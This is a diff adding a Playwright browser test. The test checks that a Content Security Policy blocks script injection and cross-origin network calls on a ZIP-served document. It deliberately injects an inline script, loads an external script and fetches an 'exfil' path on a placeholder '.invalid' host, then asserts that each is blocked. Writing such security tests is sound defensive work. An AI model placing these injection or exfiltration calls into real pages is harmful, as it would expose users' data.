@@ -64,6 +64,52 @@ def test_bundle_clean_extraction_real_http_and_browser(tmp_path):
                 assert not errors, errors
                 assert not failures, failures
                 assert all(u.startswith(base + '/') for u in requests), requests
+                # Real Chromium CSP enforcement against the ZIP-served document:
+                # DevTools evaluation initiates the probes, but browser policy
+                # must reject injected scripts and cross-origin network traffic.
+                escaped_routes = []
+
+                def record_external_route(route):
+                    escaped_routes.append(route.request.url)
+                    route.abort()
+
+                page.route('https://rea-csp-blocked.invalid/**', record_external_route)
+                page.evaluate("""() => {
+                    window.__reaCspViolations = [];
+                    document.addEventListener('securitypolicyviolation', event => {
+                        window.__reaCspViolations.push({
+                            directive: event.effectiveDirective,
+                            blocked: event.blockedURI
+                        });
+                    });
+                    const inline = document.createElement('script');
+                    inline.textContent = 'window.__reaCspInlineExecuted = true';
+                    document.head.appendChild(inline);
+                    const external = document.createElement('script');
+                    external.src = 'https://rea-csp-blocked.invalid/blocked.js';
+                    document.head.appendChild(external);
+                }""")
+                page.evaluate("""async () => {
+                    try {
+                        await fetch('https://rea-csp-blocked.invalid/api/exfil');
+                    } catch (error) {
+                        window.__reaCspFetchRejected = true;
+                    }
+                }""")
+                page.wait_for_function('window.__reaCspViolations.length >= 3', timeout=5000)
+                violations = page.evaluate('window.__reaCspViolations')
+                assert any(v['directive'] == 'script-src-elem' and
+                           v['blocked'] == 'inline' for v in violations), violations
+                assert any(v['directive'] == 'script-src-elem' and
+                           v['blocked'].endswith('/blocked.js') for v in violations), violations
+                assert any(v['directive'] == 'connect-src' and
+                           v['blocked'].endswith('/api/exfil') for v in violations), violations
+                assert page.evaluate('window.__reaCspInlineExecuted') is None
+                assert page.evaluate('window.__reaCspFetchRejected') is True
+                # Playwright's request event can record a CSP-blocked ATTEMPT.
+                # A route callback indicates an actual outgoing network attempt.
+                assert not escaped_routes, escaped_routes
+                assert not errors, errors
             finally:
                 browser.close()
     finally:
